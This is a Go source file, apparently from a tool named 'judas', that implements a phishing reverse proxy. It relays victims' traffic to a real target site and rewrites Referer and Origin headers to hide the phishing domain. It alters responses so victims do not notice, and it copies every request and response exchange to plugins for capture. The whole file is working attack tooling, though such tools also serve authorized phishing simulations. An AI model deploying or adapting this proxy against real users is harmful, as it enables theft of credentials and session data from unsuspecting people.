package judas

import (
	"context"
	"crypto/tls"
	"log"
	"net/http"
	"net/http/httputil"
	"strings"
)

// phishingProxy proxies requests between the victim and the target, queuing requests for further processing.
// It is meant to be embedded in a httputil.ReverseProxy, with the Director and ModifyResponse functions.
type phishingProxy struct {
	*Config
}

// Director updates a request to be sent to the target website
func (p *phishingProxy) Director(request *http.Request) {
	request.URL.Scheme = p.TargetURL.Scheme
	request.URL.Host = p.TargetURL.Host

	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: p.SourceInsecure}

	request.Host = p.TargetURL.Host

	// Don't let a stray referer header give away the location of our site.
	// Note that this will not prevent leakage from full URLs.
	if request.Referer() != "" {
		newReferer := strings.Replace(request.Referer(), request.Host, p.TargetURL.Host, -1)
		request.Header.Set("Referer", newReferer)
	}

	// Don't let a stray origin header give us away either.
	origin := request.Header.Get("Origin")
	if origin != "" {
		newOrigin := strings.Replace(origin, request.Host, p.TargetURL.Host, -1)
		request.Header.Set("Origin", newOrigin)
	}

	// Go supports gzip compression, but not Brotli.
	// Since the underlying transport handles compression, remove this header to avoid problems.
	request.Header.Del("Accept-Encoding")
}

// ModifyResponse updates a response to be passed back to the victim so they don't notice they're on a phishing website.
func (p *phishingProxy) ModifyResponse(response *http.Response) error {
	for _, transformer := range p.ResponseTransformers {
		err := transformer.Transform(response)
		if err != nil {
			return err
		}
	}

	return nil
}

// InterceptingTransport sends the HTTP exchange to the loaded plugins.
type InterceptingTransport struct {
	http.RoundTripper
	Plugins *PluginBroker
}

// RoundTrip executes the HTTP request and sends the exchange to judas's loaded plugins
func (t *InterceptingTransport) RoundTrip(req *http.Request) (*http.Response, error) {
	resp, err := t.RoundTripper.RoundTrip(req)
	if err != nil {
		return nil, err
	}

	request := &Request{Request: req}
	clonedRequest, err := request.CloneBody(context.Background())
	if err != nil {
		return nil, err
	}

	response := &Response{Response: resp}
	clonedResponse, err := response.CloneBody()
	if err != nil {
		return nil, err
	}

	httpExchange := &HTTPExchange{
		Request:  clonedRequest,
		Response: clonedResponse,
	}

	err = t.Plugins.SendResult(httpExchange)
	return resp, err
}

// ProxyServer exposes the reverse proxy over HTTP.
type ProxyServer struct {
	reverseProxy *httputil.ReverseProxy
	logger       *log.Logger
}

// HandleRequests reverse proxies all traffic to the target server.
func (p *ProxyServer) HandleRequests(w http.ResponseWriter, r *http.Request) {
	p.reverseProxy.ServeHTTP(w, r)
}

// New returns a http.Server configured for phishing.
func New(config *Config) *ProxyServer {
	phishingProxy := &phishingProxy{Config: config}
	reverseProxy := &httputil.ReverseProxy{
		Director:       phishingProxy.Director,
		ModifyResponse: phishingProxy.ModifyResponse,
		Transport:      phishingProxy.Transport,
	}

	return &ProxyServer{
		reverseProxy: reverseProxy,
		logger:       config.Logger,
	}
}
